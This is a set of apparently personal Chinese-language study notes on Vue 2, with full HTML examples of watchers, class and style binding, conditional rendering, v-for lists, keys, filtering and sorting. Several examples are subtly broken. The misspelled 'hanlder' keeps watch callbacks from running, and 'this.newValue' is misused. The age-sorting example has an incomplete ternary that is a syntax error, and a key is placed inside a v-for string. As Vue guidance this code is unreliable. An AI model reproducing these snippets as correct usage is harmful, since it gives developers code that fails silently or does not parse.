    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
		深度监视：
				(1).Vue中的watch默认不监测对象内部值的改变（一层）。
				(2).配置deep:true可以监测对象内部值改变（多层）。
		备注：
				(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以(想让它可以则配置deep:true)！
				(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
	-->
    <h1>今天天气很 {{ info }}</h1>
    <button @click="changeWeather">
        切换
    </button>
    <hr/>
    <h3>a的值是:{{ numbers.a }}</h3>
    <button @click="numbers.a++">
        点我让a加一
    </button>
    <h3>b的值是:{{ numbers.b }}</h3>
    <button @click="numbers.b++">
        点我让b加一
    </button>
    <h1>
        测试vue自身监测数据属性
        {{ numbers.d.e }}
    </h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:'#root',
        data:{
            isHot: true,
            numbers:{
                a:1,
                b:1,
                d:{
                    e:2
                }
            }
        },
        //计算属性
        computed: {
            info(){
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        //改变模版数据的方法
        methods:{
            changeWeather(){
                this.isHot = !this.isHot;
            }
        },
        watch:{
            //监视的配置对象
            //watch不仅能监视data的普通属性，也可以检测计算属性
            isHot:{
                //immediate: true, //当这个属性为true时，页面刚渲染就运行handler函数
                //handler 什么时候调用呢
                //当isHot发生改变就会调用该函数
                //handler接收两个参数，一个是这个状态参数改变前的值，另一个是改变后的旧值
                handler(newValue, preValue){
                    console.log('ishot 被修改了');
                    console.log(`newValue: ${newValue}, preValue: ${preValue}`);
                }
            },
            //监测多级结构里面的属性 深度监视
            // 'numbers.a':{
            //     handler(){
            //       console.log('a发生改变了')
            //     }
            // }
            //深度监视numbers中的所有属性
            numbers:{
                deep: true, //监视多级结构的属性
                handler(){
                    console.log('numbers 发生改变')
                }
            }
        }
    });

</script>
</body>
</html>
```

---

### 监视简写属性

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<div id="root">
			<h2>x的值是：{{number.x}}</h2>
			<button @click="number.x++">
				点我让x加1
			</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: true
				},
				watch: {
					// 正常写法
					ishot: {
						deep: true,
						hanlder(oldValue, newValue) {
							console.log('number发生改变')
						}
					},
					// 简写写法
					// 如果不需要设置deep和immediate属性，则可以使用如下写法
					ishot(oldValue, newValue) {
						console.log('number发生改变')
					}
				}
			})
		</script>
	</body>
</html>
```

---

### 计算属性与监视属性区别

前面的天气案例可以使用计算属性实现，也可也使用监视属性实现。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 姓名案例--计算属性实现 -->
		<div id="root">
			姓：<input type="text" v-model:value="firstName"><br>
			名：<input type="text" v-model:value="lastName"><br>
			
			姓名：<input type="text" v-model:value="fullName"><br>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					firstName: '张',
					lastName: '三',
					fullName: '张-三'
				},
				watch: {
					firstName: {
						hanlder(oldValue, newValue) {
							this.fullName = this.newValue + '-' + this.lastName
						}
					},
					lastName: {
						hanlder(oldValue, newValue) {
							this.fullName = this.firstName + '-' + this.newValue
						}
					},
					fullName: {
						hanlder(oldValue, newValue) {
							let arr = newValue.split('-')
							this.firstName = arr[0]
							this.lastName = arr[1]
						}
					}
				}
			})
		</script>
	</body>
</html>
```

如果我们需要改变firstName之后，1s后修改fullName的值

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 姓名案例--计算属性实现 -->
		<div id="root">
			姓：<input type="text" v-model:value="firstName"><br>
			名：<input type="text" v-model:value="lastName"><br>
			
			姓名：<input type="text" v-model:value="fullName"><br>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					firstName: '张',
					lastName: '三',
					fullName: '张-三'
				},
				watch: {
					firstName: {
						hanlder(oldValue, newValue) {
							// firstName修改后，1s后修改fullName值
							// 这里必须写成箭头函数
							setTimeout(() => {
								this.fullName = this.newValue + '-' + this.lastName
							}, 1000)
							
						}
					},
					lastName: {
						hanlder(oldValue, newValue) {
							this.fullName = this.firstName + '-' + this.newValue
						}
					},
					fullName: {
						hanlder(oldValue, newValue) {
							let arr = newValue.split('-')
							this.firstName = arr[0]
							this.lastName = arr[1]
						}
					}
				}
			})
		</script>
	</body>
</html>
```

但是计算属性中无法开启异步任务。

![image](5722F88DC80C4A53A6448B41F324AE31)

一旦函数中要使用vm对象的属性，写成普通函数，比如计算属性和监视属性和methods中的方法。

---

### 绑定class样式

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.normal {
				color: red;
			}
			.innormal {
				color: blue;
			}
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- :class代表绑定class样式 -->
			<div class="basic" :class="className" @click="changeStyle">{{name}}</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					className: 'normal'
				},
				methods: {
					changeStyle() {
						this.className = 'innormal'
					}
				}
			})
		</script>
	</body>
</html>
```

![image](1D3B3FE616A34009A24769D07AFF8F68)

需求1

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.normal {
				color: red;
			}
			.innormal {
				color: blue;
			}
			.others {
				color: 'black';
			}
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- :class代表绑定class样式 -->
			<div class="basic" :class="className" @click="changeStyle">{{name}}</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					className: 'normal'
				},
				methods: {
					changeStyle() {
						// 从三种样式中随机切换
						const arr = ['normal','innormal','others']
						let index = Math.floor(Math.random()*3)
						this.className = arr[index]
					}
				}
			})
		</script>
	</body>
</html>
```

![image](F80F99F452AE4C2BBE6EA8B8C09ED94A)

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.normal {
				color: red;
			}
			.innormal {
				background-color: black;
			}
			.others {
				color: 'black';
			}
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- :class代表绑定class样式 -->
			<!-- 使用的样式有多个,比如同时使用normal和innormal样式 -->
			<div class="basic" :class="classArr" @click="changeStyle">{{name}}</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					className: 'normal',
					classArr: ['normal']
				},
				methods: {
					changeStyle() {
						// 使用的样式有多个,比如同时使用normal和innormal样式
						this.classArr = ['normal','innormal']
					}
				}
			})
		</script>
	</body>
</html>
```
绑定class的写法

![image](14A9F81AB24543C6B1BA1BCD91A041F4)

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.normal {
				color: red;
			}
			.innormal {
				background-color: black;
			}
			.others {
				color: 'black';
			}
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- :class代表绑定class样式 -->
			<!-- classObj是一个对象，如果其中属性为true,则绑定对应的class -->
			<div class="basic" :class="classObj" @click="changeStyle">{{name}}</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					classObj : {
						normal : false,
						innormal : true
					}
				},
				methods: {
					changeStyle() {
						// 使用的样式有多个,比如同时使用normal和innormal样式
						this.classArr = ['normal','innormal']
					}
				}
			})
		</script>
	</body>
</html>
```

---

#### 绑定style样式

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.normal {
				color: red;
			}
			.innormal {
				background-color: black;
			}
			.others {
				color: 'black';
			}
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- 样式绑定-->
			<!-- 引号里面是一个对象，fontSize代表font-size属性 -->
			<!-- fsize代表引入data中的值 -->
			<div :style="{fontSize: fsize + 'px'}">{{name}}</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					fsize: 50
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.normal {
				color: red;
			}
			.innormal {
				background-color: black;
			}
			.others {
				color: 'black';
			}
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- 样式绑定-->
			<!-- 引号里面是一个对象 -->
			<div :style="styleObj">{{name}}</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					styleObj: {
						fontSize: '50px',
						color: red,
						backgroundColor: pink
					}
				}
			})
		</script>
	</body>
</html>
```
---

### 条件渲染

如果我们想让div时而隐藏，时而显示。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- v-show后面为false，则不显示，但是节点存在 -->
			<h2 v-show="false">欢迎来到{{name}}</h2>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉'
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- v-show后面为false，则不显示，但是节点存在 -->
			<!-- v-show后面可以为变量也可以为表达式 -->
			<h2 v-show="isShow">欢迎来到{{name}}</h2>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					isShow: false
				}
			})
		</script>
	</body>
</html>
```

动态改变元素的显示和隐藏。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		
		<div id="root">
			<!-- v-show后面为false，则不显示，但是节点存在 -->
			<!-- v-show后面可以为变量也可以为表达式 -->
			<h2 v-show="isShow">欢迎来到{{name}}</h2>
			<button @click="change">点击实现显示和隐藏</button>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					isShow: true
				},
				methods: {
					change() {
						this.isShow = !this.isShow
					}
				}
			})
			
		</script>
	</body>
</html>
```

---

### v-if指令

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		if
		<div id="root">
			<!-- v-if后面为false，则不显示，此时节点存在 -->
			<!-- v-if后面可以为变量也可以为表达式 -->
			<h2 v-if="isShow">欢迎来到{{name}}</h2>
			<button @click="change">点击实现显示和隐藏</button>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					isShow: true
				},
				methods: {
					change() {
						this.isShow = !this.isShow
					}
				}
			})
			
		</script>
	</body>
</html>
```

---

### v-if v-else-if v-else指令

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<!-- 如果n === 1，显示，后面不在判断 -->
			<!-- v-if v-else-if v-else是一组判断 -->
			<!-- 下面4个div不许打乱 -->
			<div v-if="n == 1">1</div>
			<div v-else-if="n == 2">2</div>
			<div v-else-if="n == 3">3</div>
			<div v-else="">4</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					n: 2
				}
			})
			
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<!-- n === 1,下面标签全部显示 -->
			<!-- 下面写法有点麻烦，必须在3个h2中写上v-if-->
			<h2 v-if='n === 1'>1</h2>
			<h2 v-if='n === 1'>2</h2>
			<h2 v-if='n === 1'>3</h2>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					n: 1
				}
			})
			
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<!-- n === 1,下面标签全部显示 -->
			<!-- 这样方便一点，但是改变了网页的结构 -->
			<div v-if="n === 1">
				<h2>1</h2>
				<h2>2</h2>
				<h2>3</h2>
			</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					n: 1
				}
			})
			
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<!-- n === 1,下面标签全部显示 -->
			<!-- 这样方便一点，不会改变网页结构 -->
			<template v-if="n === 1">
				<h2>1</h2>
				<h2>2</h2>
				<h2>3</h2>
			</template>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					name: '武汉',
					n: 1
				}
			})
			
		</script>
	</body>
</html>
```

template只能与v-if使用，不可与v-show使用。

![image](BF41DD1F5E1540F7ACAF394236CF64AE)

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>条件渲染</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<!--
				条件渲染：
							1.v-if
										写法：
												(1).v-if="表达式"
												(2).v-else-if="表达式"
												(3).v-else="表达式"
										适用于：切换频率较低的场景。
										特点：不展示的DOM元素直接被移除。
										注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

							2.v-show
										写法：v-show="表达式"
										适用于：切换频率较高的场景。
										特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

							3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
		 -->

<div id="root">
    <!--v-show要能转换为一个布尔值 v-show条件渲染-->
<!--    <h2 v-show="a">欢迎来到{{ name }}</h2>-->

<!--    <h2 v-show="1===1">欢迎来到{{ name }}</h2>-->
<!--    <button @click='a = !a'>{{ a ? '隐藏': '显示' }}</button>-->
    <!--使用v-if来进行条件渲染 -->
<!--    <h2 v-if="1">欢迎来到{{ name }}</h2>-->
    <!--v-if v-else-if v-else记住不能打断，要连着写-->
<!--    <h2>当前的n值是{{ n }}</h2>-->
    <button @click="n++">点我n+1</button>
<!--    <div v-if="n === 1">angular</div>-->
<!--    <div v-else-if="n === 2">react</div>-->
<!--&lt;!&ndash;    <div>111</div>&ndash;&gt;-->
<!--    <div v-else-if="n === 3">vue js</div>-->
<!--    <div v-else>not found</div>-->

    <!--v-if与template的配合使用-->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>shanghai</h2>
        <h2>shenzhen</h2>
    </template>
</div>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data:{
            name: 'shanghai',
            n:0
        }
    })
</script>
</body>
</html>
```

---

### 列表渲染

实现案例

![image](223DFDB226464125B58E17A5E5CAD049)

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<ul>
				<li v-for="p in persons">
					{{p.id}}--{{p.name}}--{{p.age}}
				</li>
			</ul>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					persons:[
						{
							id: '001',
							name:'张三',
							age: 18
						},
						{
							id: '002',
							name: '李四',
							age: 22
						},
						{
							id: '003',
							name: '王五',
							age: 24
						},
					]
				}
			})
			
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<ul>
				<!-- :key=p.id可以让每一个li生成一个标识 -->
				<li v-for="p in persons :key=p.id">
					{{p.id}}--{{p.name}}--{{p.age}}
				</li>
			</ul>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					persons:[
						{
							id: '001',
							name:'张三',
							age: 18
						},
						{
							id: '002',
							name: '李四',
							age: 22
						},
						{
							id: '003',
							name: '王五',
							age: 24
						},
					]
				}
			})
			
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<ul>
				<!-- p代表每一个对象，index代表该对象在数组中的索引 -->
				<li v-for="(p, index) in persons :key=index">
					{{p.id}}--{{p.name}}--{{p.age}}--{{p.index}}
				</li>
			</ul>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					persons:[
						{
							id: '001',
							name:'张三',
							age: 18
						},
						{
							id: '002',
							name: '李四',
							age: 22
						},
						{
							id: '003',
							name: '王五',
							age: 24
						},
					]
				}
			})
			
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<ul>
				<!-- 遍历对象，value代表每一个属性值,key代表属性名 -->
				<li v-for="(value, keyName) of car" :key="keyName">
					{{value}}--{{key}}
				</li>
			</ul>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					car: {
						name: '奥迪A8',
						price: '70w',
						color: '黑色'
					}
				}
			})
			
		</script>
	</body>
</html>
```
![image](EC18344BD23B411097049520D3B55FAD)

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>基本列表</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			v-for指令:
						1.用于展示列表数据
						2.语法：v-for="(item, index) in xxx" :key="yyy"
						3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
	-->
    <h2>人员列表</h2>
    <ul>
        <!--遍历数组-->
        <!--循环列表的方法 类似与for in循环遍历-->
        <!--:代表v-bind 属性key让每一个li有了唯一的标识,key一定不要重复-->
        <!--v-for(for in// for of)可以接受到两个参数,一个是当前的元素另一个是当前元素的索引 类似于下面的person,index-->
        <li v-for='(person, index) in persons' :key="index">
            <!--p可能来自形参，也可能来自于写在data里的属性，更可能来自于计算属性 computed-->
            {{person.name}} - {{ person.age }}
        </li>
    </ul>
    <!--遍历对象-->
    <h2>汽车信息</h2>
    <!--注意遍历对象的时候先收到的是每一项的属性的value，第二项是对应的键名:key-->
    <ul v-for="(val, key) of car" :key="key">
         <li>{{ key }} -- {{ val }}</li>
    </ul>
    <!--遍历字符串 用的不多-->
    <h2>测试遍历字符串</h2>
    <!--注意遍历字符串的时候先收到的是字符串中每一个字符，第二项是其对应的索引index-->
    <ul v-for="(c, index) of str" :key="index">
        <li>{{ index }} -- {{ c }}</li>
    </ul>
    <!--遍历指定次数-->
    <h2>遍历指定次数</h2>
    <!--注意遍历指定次数的时候先收到的是number(例如5，则number是1，2，3，4，5)，第二项是对应index(从0开始计数,则是0,1,2,3,4)-->
    <ul v-for="(num, index) in 5" :key="index">
        <li>{{ index }} -- {{ num }}</li>
    </ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            //数组
            persons: [
                {id: '001', name: '张三', age: 18},
                {id: '002', name: '李四', age: 19},
                {id: '003', name: '王五', age: 20}
            ],
            car: {
                name: '奥迪a8',
                price: '70w',
                color: '黑色'
            },
            str: 'hello'
        }
    })
</script>
</body>
</html>
```
---

### Vue中key作用

讲解视频：https://www.bilibili.com/video/BV1Zy4y1K7SH?p=30&spm_id_from=pageDriver&vd_source=2eee47d702302407e4fd46a6edc82d55

![image](8576113DEE9149AA92CFE2B069797539)

存在效率低的问题。

![image](BCB04886B4304A78A290E837F3C707B4)

如果在遍历是没有显示指定key，Vue会将遍历时的index作为每一个的key值。

key最好写成唯一的标识。

![image](A81D242B7896498893F7494C17015C1B)

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>基本列表</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
				面试题：react、vue中的key有什么作用？（key的内部原理）

						1. 虚拟DOM中key的作用：
										key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】,
										随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

						2.对比规则：
									(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
												①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
												②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。

									(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
												创建新的真实DOM，随后渲染到到页面。

						3. 用index作为key可能会引发的问题：
											1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
															会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。

											2. 如果结构中还包含输入类的DOM：
															会产生错误DOM更新 ==> 界面有问题。

						4. 开发中如何选择key?:
											1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
											2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
												使用index作为key是没有问题的。
		-->
    <h2>人员列表</h2>
    <button @click.once="add">添加一个老刘</button>
    <ul>
        <!--key唯一标识: 身份证，属性key是被vue给征用的，并不反应在真实dom上-->
        <li v-for='(person, index) in persons' :key="person.id">
            {{person.name}} - {{ person.age }}
            <!--为了看到key值的不正确滥用所导致的问题，我们添加一个input框-->
            <input type="text" />
        </li>
    </ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            //数组
            persons: [
                {id: '001', name: '张三', age: 18},
                {id: '002', name: '李四', age: 19},
                {id: '003', name: '王五', age: 20}
            ],
        },
        methods:{
            add(){
                //往数组的头添加元素
                this.persons.unshift({
                    id:'004',
                    name:'老刘',
                    age: 40
                })
            }
        }
    })
</script>
</body>
</html>
```

---

### 列表过滤

列表过滤案例

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" v-model:placeholder="nameKeyWords">
			<ul>
				<li v-for="(p, index) of filterPersons" :key="p.id">
					{{p.name}}--{{p.age}}--{{p.sex}}
				</li>
			</ul>
			
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					nameKeyWords: '',
					persons: [{
							id: '001',
							name: '马冬梅',
							age: 18,
							sex: '女'
						},
						{
							id: '002',
							name: '周冬雨',
							age: 22,
							sex: '女'
						},
						{
							id: '003',
							name: '周杰伦',
							age: 24,
							sex: '男'
						},
						{
							id: '004',
							name: '温兆伦',
							age: 24,
							sex: '男'
						},
					],
					filterPersons : []
				},
				watch: {
					nameKeyWords(newValue) {
						this.filterPersons = this.persons.filter((items) => {
							return items.name.indexOf(newValue) != -1
						})
					}
				}
			})
			
		</script>
	</body>
</html>
```

计算属性写法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" v-model:placeholder="nameKeyWords">
			<ul>
				<li v-for="(p, index) of filPersons" :key="p.id">
					{{p.name}}--{{p.age}}--{{p.sex}}
				</li>
			</ul>
			
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					nameKeyWords: '',
					persons: [{
							id: '001',
							name: '马冬梅',
							age: 18,
							sex: '女'
						},
						{
							id: '002',
							name: '周冬雨',
							age: 22,
							sex: '女'
						},
						{
							id: '003',
							name: '周杰伦',
							age: 24,
							sex: '男'
						},
						{
							id: '004',
							name: '温兆伦',
							age: 24,
							sex: '男'
						},
					],
				},
				computed: {
					filPersons() {
						return this.persons.filter((p) => {
							return p.name.indexOf(this.nameKeyWords) !== -1
						})
					}
				}
				
			})
			
		</script>
	</body>
</html>
```

---

### 按年龄排序

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<input type="text" v-model:placeholder="nameKeyWords">
			<ul>
				<li v-for="(p, index) of filterPersons" :key="p.id">
					{{p.name}}--{{p.age}}--{{p.sex}}
				</li>
			</ul>
			<button @click="changeToAsOrder">按年龄升序</button>
			<button @click="changeToDeOrder">按年龄降序</button>
			<button @click="changeToOriginal">保持原样</button>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					nameKeyWords: '',
					sortType: 0,
					persons: [
						{
							id: '001',name: '马冬梅',age: 18,sex: '女'
						},
						{
							id: '002',name: '周冬雨',age: 31,sex: '女'
						},
						{
							id: '003',name: '周杰伦',age: 27,sex: '男'
						},
						{
							id: '004',name: '温兆伦',age: 24,sex: '男'
						},
					],
				},
				methods: {
					changeToAsOrder() {
						this.sortType = 1
					},
					changeToDeOrder() {
						this.sortType = 2
					},
					changeToOriginal() {
						this.sortType = -1
					}
				},
				computed: {
					filterPersons() {
						const arr =  this.persons.filter((p) => {
							return p.name.indexOf(this.nameKeyWords) !== -1
						})
						if(this.sortType) {
							arr.sort((a,b) => {
								return this.sortType === 1 ? a.age-b.age
							})
						}
						return arr
					}
				}	
			})
			
		</script>
	</body>
</html>
```

---

### 数据变化时发生什么

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>人员列表</h2>
			<ul>
				<li v-for="(p, index) of persons" :key="p.id">
					{{p.name}}--{{p.age}}--{{p.sex}}
				</li>
			</ul>
			<button @click="updateInfo">更新数据</button>
			
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					persons: [
						{
							id: '001',name: '马冬梅',age: 18,sex: '女'
						},
						{
							id: '002',name: '周冬雨',age: 31,sex: '女'
						},
						{
							id: '003',name: '周杰伦',age: 27,sex: '男'
						},
						{
							id: '004',name: '温兆伦',age: 24,sex: '男'
						},
					],
				},
				methods: {
					updateInfo() {
						this.persons[0] = {id: '001',name: '马老师',age: 18,sex: '女'}
					}
				}
			})
			
		</script>
	</body>
</html>
```

第一个列表的信息未发生改变。

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
